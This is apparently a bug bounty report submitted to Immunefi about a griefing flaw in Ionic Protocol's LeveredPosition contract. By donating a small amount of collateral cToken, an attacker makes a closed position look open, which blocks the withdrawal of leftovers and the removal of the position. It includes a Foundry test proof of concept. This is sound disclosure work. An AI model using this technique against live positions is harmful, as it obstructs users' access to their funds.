
# Malicious users can obstruct the execution of withdrawStableLeftovers and removeClosedPosition at a low cost.

Submitted on Fri Jun 14 2024 02:38:48 GMT-0400 (Atlantic Standard Time) by @p0wd3r for [IOP | Ionic](https://immunefi.com/bounty/ionic-iop/)

Report ID: #32206

Report type: Smart Contract

Target: https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
## Brief/Intro
`withdrawStableLeftovers` and `removeClosedPosition` both need to determine `isPositionClosed`, and an attacker can change the return result of `isPositionClosed`, thereby affecting the execution of those two functions.

## Vulnerability Details
`withdrawStableLeftovers` and `removeClosedPosition` both require `isPositionClosed` to return true.

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L135-L142
```solidity
  function withdrawStableLeftovers(address withdrawTo) public returns (uint256) {
    if (msg.sender != positionOwner) revert NotPositionOwner();
    if (!isPositionClosed()) revert OnlyWhenClosed();

    uint256 stableLeftovers = stableAsset.balanceOf(address(this));
    stableAsset.safeTransfer(withdrawTo, stableLeftovers);
    return stableLeftovers;
  }
```

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPositionFactoryFirstExtension.sol#L62-L69
```solidity
  function _removeClosedPosition(address closedPosition, address positionOwner) internal returns (bool removed) {
    EnumerableSet.AddressSet storage userPositions = positionsByAccount[positionOwner];
    if (!userPositions.contains(closedPosition)) revert NoSuchPosition();
    if (!LeveredPosition(closedPosition).isPositionClosed()) revert PositionNotClosed();

    removed = userPositions.remove(closedPosition);
    if (userPositions.length() == 0) accountsWithOpenPositions.remove(positionOwner);
  }
```

The basis for determining `isPositionClosed` is whether the col balance of the position is 0.
https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L283-L285
```solidity
  function isPositionClosed() public view returns (bool) {
    return collateralMarket.balanceOfUnderlying(address(this)) == 0;
  }
```

Therefore, the attacker can pre-transfer a small amount of cToken to the position before the execution of `withdrawStableLeftovers` and `removeClosedPosition`, causing its `balanceOfUnderlying` to be non-zero, thereby hindering the execution of those two functions.

## Impact Details
Malicious users can obstruct the execution of withdrawStableLeftovers and removeClosedPosition at a low cost.

If users want to avoid the impact of the vulnerability, they need to execute `closePosition+withdrawStableLeftovers` or `closePosition+removeClosedPosition` in a single transaction, increasing the difficulty of operation and gas consumption for users.

## References
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L135-L142
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPositionFactoryFirstExtension.sol#L62-L69
- https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L283-L285
        
## Proof of concept
## Proof of Concept
```
git diff contracts/test/LeveredPositionTest.t.sol
```
```
diff --git a/contracts/test/LeveredPositionTest.t.sol b/contracts/test/LeveredPositionTest.t.sol
index a168276..a7d769b 100644
--- a/contracts/test/LeveredPositionTest.t.sol
+++ b/contracts/test/LeveredPositionTest.t.sol
@@ -418,6 +418,24 @@ abstract contract LeveredPositionTest is MarketsTest {

     assertEq(position.getEquityAmount(), 0, "!nonzero equity amount");
     assertEq(position.getCurrentLeverageRatio(), 0, "!nonzero leverage ratio");
+
+    // test withdrawStableLeftovers && removeClosedPosition
+
+    deal(address(stableAsset), address(position), 1e18);
+    assertEq(stableAsset.balanceOf(address(position)), 1e18, "!stable leftovers");
+
+    address attacker = makeAddr("attacker");
+    deal(address(collateralMarket), attacker, 10);
+    vm.startPrank(attacker);
+    collateralMarket.transfer(address(position), 10);
+    assertGt(collateralMarket.balanceOfUnderlying(address(position)), 0);
+    vm.stopPrank();
+
+    vm.expectRevert();
+    position.withdrawStableLeftovers(msg.sender);
+
+    vm.expectRevert();
+    factory.removeClosedPosition(address(position));
   }
 }
```
```
forge test --mc 'ModeWethUSDCLeveredPositionTest' --mt 'testLeverMaxDown' -vv

Ran 1 test for contracts/test/LeveredPositionTest.t.sol:ModeWethUSDCLeveredPositionTest
[PASS] testLeverMaxDown() (gas: 11310731)
Logs:
  max ratio: 1885965988637688719
  min ratio: 1017680935483941946
  withdraw amount: 99431346225800302

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 166.16s (32.62s CPU time)

Ran 1 test suite in 166.34s (166.16s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```